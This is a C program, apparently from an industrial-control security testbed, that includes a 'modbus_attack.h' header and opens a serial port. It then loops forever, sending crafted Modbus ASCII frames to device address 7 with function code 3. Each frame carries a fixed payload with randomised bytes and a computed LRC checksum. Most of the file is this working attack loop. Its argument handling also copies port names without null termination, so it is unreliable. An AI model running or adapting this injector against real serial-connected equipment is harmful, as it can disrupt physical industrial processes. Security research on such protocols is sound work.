#define FORLINUX

#include "modbus.h"
#include "modbus_attack.h"

void device(int rtu, struct timespec req, struct timespec rem);

int main(int argc, char *argv[]){

  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];
  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;
  int cnt1 = 0, cnt2;

  strcpy(inport,"/dev/ttyUSB2");
  strcpy(outport,"/dev/ttyUSB0");

   for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len);
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      }
      strncpy(outport, argv[i+1],len);
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) {
   return (port);
  }
  printf("open %s ok port = %d\n", outport, port);
  
  char *str;
  unsigned char lrc, top, bottom;

  addr = (unsigned char) 0x07;
  fc = (unsigned char) 0x03;
  while(1){
  for(cnt2=0; cnt2<=255;cnt2++){
    datalen = 21;
    data[0] = 0x14;
    data[1] = 0x10;
    data[2] = 0x10;
    data[3] = 0x0e;
    data[4] = 0x10;
    data[5] = 0x18;
    data[6] = 0x05;
    data[7] = 0x00;
    data[8] = 0x01;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = rand();
    data[16] = rand();
    data[17] = 0xe6;
    data[18] = 0xd2;
    data[19] = 0x00;
    data[20] = 0x00;

 
    str = malloc(datalen + 2);
    str[0] = addr;
    str[1] = fc;
    memcpy(str+2, data, datalen);   
    lrc = LRC(str,datalen+2);
    free(str);    
    byte2ascii(lrc, &top, &bottom);
    //crc[0] = 0x34;
    // crc[1] = 0x39;
    crc[0] = top;
    crc[1] = bottom;
    pdu = mkpdu(addr, fc, data, datalen, crc);
    sendmodbus_ascii(port, pdu);
    freepdu(pdu);
    printf("number is %d\n", cnt2);
    sleep(3);
 }
  } 
}
